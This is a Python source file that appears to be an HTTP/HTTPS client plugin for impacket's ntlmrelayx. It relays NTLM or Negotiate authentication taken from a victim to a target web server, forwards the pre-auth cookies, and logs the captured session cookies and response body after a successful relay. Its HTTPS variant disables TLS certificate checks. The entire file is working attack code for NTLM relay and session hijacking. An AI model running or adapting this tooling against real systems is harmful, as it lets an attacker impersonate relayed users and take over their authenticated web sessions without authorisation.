import base64
import ssl
from http.client import HTTPConnection, HTTPSConnection
from struct import unpack

from impacket import LOG
from impacket.examples.ntlmrelayx.clients import ProtocolClient
from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
from impacket.ntlm import NTLMAuthChallenge, NTLMAuthChallengeResponse
from impacket.spnego import SPNEGO_NegTokenResp

PROTOCOL_CLIENT_CLASSES = ["WebRelayXClient", "WebRelayXClientHTTPS"]

_seen_relays: set[tuple[str, str]] = set()


def _build_cookie_header(set_cookie_headers: list[str]) -> str:
    parts = []
    for raw in set_cookie_headers:
        nv = raw.split(";")[0].strip()
        if nv:
            parts.append(nv)
    return "; ".join(parts)


class WebRelayXClient(ProtocolClient):

    PLUGIN_NAME = "HTTP"

    def __init__(self, serverConfig, target, targetPort=80, extendedSecurity=True):
        ProtocolClient.__init__(
            self, serverConfig, target, targetPort, extendedSecurity
        )
        self.extendedSecurity = extendedSecurity
        self.negotiateMessage = None
        self.authenticateMessageBlob = None
        self.server = None
        self.authenticationMethod = None

    def initConnection(self):
        self.session = HTTPConnection(self.targetHost, self.targetPort)
        self.lastresult = None
        self.path = self.target.path if self.target.path else "/"
        self.query = self.target.query
        return True

    def killConnection(self):
        if self.session is not None:
            self.session.close()
            self.session = None

    def keepAlive(self):
        self.session.request("HEAD", "/favicon.ico")
        self.session.getresponse()

    def sendNegotiate(self, negotiateMessage):
        url = (self.path + "?" + self.query) if self.query else self.path

        # check and store cookies that are set before auth
        self.session.request("GET", url)
        res = self.session.getresponse()
        res.read()

        pre_auth_cookies: list[str] = res.headers.get_all("Set-Cookie") or []
        self.sessionData["pre_auth_cookies"] = pre_auth_cookies
        if pre_auth_cookies:
            LOG.debug(
                "Collected %d pre-auth cookie(s) from %s",
                len(pre_auth_cookies),
                self.targetHost,
            )

        if res.status != 401:
            LOG.info(
                "Target returned HTTP %d: authentication may not be required",
                res.status,
            )

        www_auth = res.getheader("WWW-Authenticate", "")
        if "NTLM" not in www_auth and "Negotiate" not in www_auth:
            LOG.error(
                "Target does not offer NTLM/Negotiate: offered: %s",
                www_auth,
            )
            return False

        self.authenticationMethod = "NTLM" if "NTLM" in www_auth else "Negotiate"

        # retrieve challenge with cookies for session storage
        negotiate = base64.b64encode(negotiateMessage).decode("ascii")
        headers: dict[str, str] = {
            "Authorization": "%s %s" % (self.authenticationMethod, negotiate)
        }
        cookie_header = _build_cookie_header(pre_auth_cookies)
        if cookie_header:
            headers["Cookie"] = cookie_header
        self.session.request("GET", url, headers=headers)
        res = self.session.getresponse()
        res.read()

        try:
            import re

            server_challenge_b64 = re.search(
                r"%s ([a-zA-Z0-9+/]+=*)" % self.authenticationMethod,
                res.getheader("WWW-Authenticate", ""),
            ).group(1)
            server_challenge = base64.b64decode(server_challenge_b64)
            challenge = NTLMAuthChallenge()
            challenge.fromString(server_challenge)
            return challenge
        except (IndexError, KeyError, AttributeError, TypeError):
            LOG.error("No NTLM challenge returned from %s", self.targetHost)
            return False

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        # Unwrap SPNEGO wrapper when present
        if (
            unpack("B", authenticateMessageBlob[:1])[0]
            == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP
        ):
            resp_token = SPNEGO_NegTokenResp(authenticateMessageBlob)
            token = resp_token["ResponseToken"]
        else:
            token = authenticateMessageBlob

        auth = base64.b64encode(token).decode("ascii")
        headers: dict[str, str] = {
            "Authorization": "%s %s" % (self.authenticationMethod, auth)
        }
        pre_auth_cookies: list[str] = self.sessionData.get("pre_auth_cookies", [])
        cookie_header = _build_cookie_header(pre_auth_cookies)
        if cookie_header:
            headers["Cookie"] = cookie_header

        url = (self.path + "?" + self.query) if self.query else self.path
        self.session.request("GET", url, headers=headers)
        res = self.session.getresponse()

        cookies = res.headers.get_all("Set-Cookie") or []
        if cookies:
            self.sessionData["cookies"] = cookies
            LOG.info(
                "Captured %d cookie(s) from %s after successful relay",
                len(cookies),
                self.targetHost,
            )
        else:
            self.sessionData.setdefault("cookies", [])

        # Also save the raw response body for optional use by the attack class
        self.lastresult = res.read()

        if res.status == 401:
            return None, STATUS_ACCESS_DENIED

        LOG.info(
            "HTTP %d from %s – treating as successful authentication",
            res.status,
            self.targetHost,
        )

        _seen_relays.add(
            (self.targetHost, self.targetPort)
        )  # populate gobal already seen relays

        return None, STATUS_SUCCESS


class WebRelayXClientHTTPS(WebRelayXClient):
    PLUGIN_NAME = "HTTPS"

    def __init__(self, serverConfig, target, targetPort=443, extendedSecurity=True):
        WebRelayXClient.__init__(
            self, serverConfig, target, targetPort, extendedSecurity
        )

    def initConnection(self):
        self.lastresult = None
        self.path = self.target.path if self.target.path else "/"
        self.query = self.target.query

        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE  # again we ignore all tls errors

        self.session = HTTPSConnection(self.targetHost, self.targetPort, context=ctx)
        return True
